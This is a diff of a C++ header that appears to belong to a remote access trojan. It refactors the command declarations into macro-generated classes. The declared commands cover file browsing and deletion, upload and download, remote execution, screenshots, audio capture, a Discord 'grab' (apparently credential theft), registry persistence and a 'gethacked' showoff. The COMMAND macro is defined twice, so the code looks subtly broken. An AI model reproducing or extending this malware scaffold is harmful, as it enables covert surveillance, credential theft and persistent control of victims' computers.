@@ -8,42 +8,53 @@
 
 class Controller;
 
-enum class NavigateCommand {
+enum class NavigateCommandEnum {
     ls, cd, pwd, rm
 };
 
-enum class AudioCommand {
+enum class AudioCommandEnum {
     start, stop, list
 };
 
-enum class DiscordCommand {
+enum class DiscordCommandEnum {
     check, grab
 };
 
-enum class ShowoffCommand {
+enum class ShowoffCommandEnum {
     gethacked, hi
 };
 
+#define COMMAND(num, name) \
+    class name##Command : public Command<num> { \
+    public: \
+        int execute(Controller&) override; \
+    }
+#define COMMAND(num, name, ...) \
+    class name##Command : public Command<num, __VA_ARGS__> { \
+    public: \
+        int execute(Controller&, ##__VA_ARGS__) override; \
+    }
+
 // navigation.cpp
-int navigation(Controller& ctrl, uint8_t cmd, const std::string path);
-// files.cpp
-int downloadFile(Controller& ctrl, const std::string path);
-int uploadFile(Controller& ctrl, const std::string path, std::vector<uint8_t> data);
-// exec.cpp
-int exec(Controller& ctrl, std::string cmd, bool wait);
-// screen.cpp
-int screenshot(Controller& ctrl);
-// audio.cpp
-int audioCommand(Controller& ctrl, AudioCommand cmd);
+COMMAND(3, Navigation, uint8_t, const std::string);
 // discord.cpp
-int discordCommand(Controller& ctrl, DiscordCommand cmd);
+COMMAND(4, Discord, DiscordCommandEnum);
+// exec.cpp
+COMMAND(5, Exec, std::string, bool);
+// screen.cpp
+COMMAND(6, Screenshot);
+// audio.cpp
+COMMAND(7, Audio, AudioCommandEnum);
+// files.cpp
+COMMAND(8, DownloadFile, const std::string);
+COMMAND(9, UploadFile, const std::string, std::vector<uint8_t>);
 // persistence.cpp
-int persist(Controller& ctrl, const std::string regkey);
+COMMAND(10, Persist, const std::string);
 // dialog.cpp
-int dialog(Controller& ctrl, uint32_t type, std::string message, std::string title);
+COMMAND(11, Dialog, uint32_t, std::string, std::string);
 // showoff.cpp
-int showoff(Controller& ctrl, uint8_t type);
+COMMAND(12, Showoff, uint8_t);
 // shellexec.cpp
-int shellExecute(Controller& ctrl, const std::optional<std::string> verb, const std::optional<std::string> file, const std::optional<std::string> param, const std::optional<std::string> dir, const std::optional<int> nShowCmd);
+COMMAND(13, ShellExecute, const std::optional<std::string>, const std::optional<std::string>, const std::optional<std::string>, const std::optional<std::string>, const std::optional<int>);
 
 #endif
